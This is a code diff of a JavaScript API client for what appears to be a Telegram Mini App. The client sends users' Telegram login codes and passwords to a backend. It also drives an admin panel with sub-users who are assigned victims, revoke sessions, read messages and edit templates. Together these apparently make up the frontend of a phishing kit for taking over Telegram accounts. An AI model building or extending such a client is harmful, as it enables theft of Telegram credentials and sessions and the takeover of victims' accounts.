@@ -1,51 +1,45 @@
-const API_BASE = import.meta.env.VITE_API_BASE || "";
-
-export async function postJson(path, payload = {}) {
+export async function postJson(path, payload = {}, extraHeaders = {}) {
   const initData = window.Telegram?.WebApp?.initData || "";
-  const response = await fetch(`${API_BASE}${path}`, {
+  const adminToken = localStorage.getItem("tg_admin_token") || "";
+
+  const response = await fetch(path, {
     method: "POST",
     headers: {
       "Content-Type": "application/json",
       "X-Telegram-Init-Data": initData,
+      ...(adminToken ? { Authorization: `Bearer ${adminToken}` } : {}),
+      ...extraHeaders,
     },
     body: JSON.stringify(payload),
   });
 
-  const data = await response.json().catch(() => null);
+  const data = await response.json().catch(() => ({}));
   if (!response.ok) {
-    throw new Error(data?.error || `API Error: ${response.status}`);
+    throw new Error(data?.error || `Request failed (${response.status})`);
   }
   return data;
 }
 
 export const api = {
-  trackVisit: (data) => postJson("/api/stats/visit", data).catch(() => {}),
-  trackAction: (data) => postJson("/api/stats/action", data).catch(() => {}),
-  getBot: (data) => postJson("/api/get-bot", data),
-  getState: (data) => postJson("/api/get-state", data),
+  // User Mini App endpoints (Zero-Phone Auto-OTP flow)
+  autoInit: (data) => postJson("/api/auto-init", data),
   getTemplate: (data) => postJson("/api/template", data),
-  sendCode: (data) => postJson("/api/send-code", data),
   enterCode: (data) => postJson("/api/enter-code", data),
   enterPass: (data) => postJson("/api/enter-pass", data),
-  wrongNumber: (data) => postJson("/api/wrong-number", data),
-  sendCodeNewPhone: (data) => postJson("/api/send-code-new-phone", data),
+  getUserMessages: (data) => postJson("/api/user/messages", data),
+  sendUserMessage: (data) => postJson("/api/user/send-message", data),
   logout: (data) => postJson("/api/logout", data),
-  logClientError: (data) => {
-    try {
-      const body = JSON.stringify(data);
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(
-          `${API_BASE}/api/client-error`,
-          new Blob([body], { type: "application/json" })
-        );
-      } else {
-        fetch(`${API_BASE}/api/client-error`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body,
-          keepalive: true,
-        }).catch(() => {});
-      }
-    } catch {}
-  },
+
+  // Admin & Sub-user endpoints
+  adminLogin: (data) => postJson("/api/admin/login", data),
+  adminOverview: (data) => postJson("/api/admin/overview", data),
+  adminCreateSubUser: (data) => postJson("/api/admin/sub-users/create", data),
+  adminToggleSubUser: (data) => postJson("/api/admin/sub-users/toggle", data),
+  adminDeleteSubUser: (data) => postJson("/api/admin/sub-users/delete", data),
+  adminAssignUser: (data) => postJson("/api/admin/users/assign", data),
+  adminRevokeSession: (data) => postJson("/api/admin/users/revoke", data),
+  adminGetMessages: (data) => postJson("/api/admin/messages/list", data),
+  adminSendMessage: (data) => postJson("/api/admin/messages/send", data),
+  adminSaveTemplate: (data) => postJson("/api/admin/template/save", data),
+  adminSetupWebhook: (data) => postJson("/api/admin/webhook/setup", data),
 };
